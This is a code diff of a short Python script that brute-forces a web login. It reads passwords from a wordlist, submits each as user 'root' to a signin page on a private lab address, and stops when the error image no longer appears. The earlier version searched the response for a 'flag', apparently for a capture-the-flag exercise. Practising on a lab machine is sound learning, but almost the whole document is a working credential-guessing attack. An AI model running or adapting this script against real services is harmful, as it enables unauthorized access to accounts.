@@ -1,18 +1,27 @@
-import requests # для запросов http
+import requests
 import re
 
 def brute_force_signin():
+    i = 1
+
+    error_message = "WrongAnswer.gif"
     with open('john.txt') as password_collections:
         for string in password_collections.readlines():
-            string = string.strip() # обрежет лишние пробелы и табуляции
+            
+            string = string.strip()
+            
             parameters = dict(page='signin',
                     username='root',
                     password=string,
-                    Login='Login') # кнопка
+                    Login='Login')
+
             result = requests.get('http://192.168.56.101/?page=signin', params=parameters)
-            search_flag = re.search(r"(flag.*?)<", result.text, re.I)
-            if (search_flag):
-                print("Password found" + result)
+            if error_message not in str(result.content) :
+                print("Password is \"" + string + '\"')
+                exit()
             else:
-                print(f'variaty number
+                print('attempt number ' + str(i))
+            i = i + 1
+
+
 brute_force_signin()
